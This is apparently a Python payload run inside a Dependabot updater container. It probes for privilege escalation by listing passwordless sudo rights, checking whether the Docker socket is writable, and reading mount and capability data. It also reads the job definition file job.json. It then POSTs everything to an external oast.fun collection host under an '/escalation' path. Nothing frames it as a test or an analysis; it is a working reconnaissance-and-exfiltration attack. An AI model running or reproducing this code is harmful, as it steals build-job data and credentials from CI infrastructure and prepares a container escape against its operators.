  import subprocess, urllib.request, json
                                                                                                                                                             
  results = {}
                                                                                                                                                             
  # check what sudo allows without a password                                                                                                                
  try:
      results["sudo_l"] = subprocess.run(                                                                                                                    
          ["sudo", "-n", "-l"],                                   
          capture_output=True, text=True, timeout=5                                                                                                          
      ).stdout
      results["sudo_err"] = subprocess.run(                                                                                                                  
          ["sudo", "-n", "-l"],                                   
          capture_output=True, text=True, timeout=5                                                                                                          
      ).stderr
  except Exception as e:                                                                                                                                     
      results["sudo_l"] = str(e)                                  
                                                                                                                                                             
  # read the job definition file
  try:                                                                                                                                                       
      with open("/home/dependabot/dependabot-updater/job.json", "r") as f:
          results["job_json"] = json.load(f)                                                                                                                 
  except Exception as e:
      results["job_json"] = str(e)                                                                                                                           
                                                                                                                                                             
  # check for docker socket
  import os                                                                                                                                                  
  results["docker_socket"] = os.path.exists("/var/run/docker.sock")
  results["docker_socket_writable"] = os.access("/var/run/docker.sock", os.W_OK)
                                                                                                                                                             
  # check mounted host paths
  try:                                                                                                                                                       
      results["mounts"] = subprocess.check_output(                
          ["cat", "/proc/mounts"], text=True                                                                                                                 
      )
  except Exception as e:                                                                                                                                     
      results["mounts"] = str(e)                                  
                                                                                                                                                             
  # check capabilities
  try:                                                                                                                                                       
      results["capsh"] = subprocess.check_output(                 
          ["cat", "/proc/self/status"], text=True
      )
  except Exception as e:
      results["capsh"] = str(e)
                                                                                                                                                             
  _req = urllib.request.Request(
      "http://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/escalation",                                                                                                               
      data=json.dumps(results).encode(),                                                                                                                     
      headers={"Content-Type": "application/json"},                                                                                                          
      method="POST"                                                                                                                                          
  )                                                                                                                                                          
  urllib.request.urlopen(_req, timeout=10) 
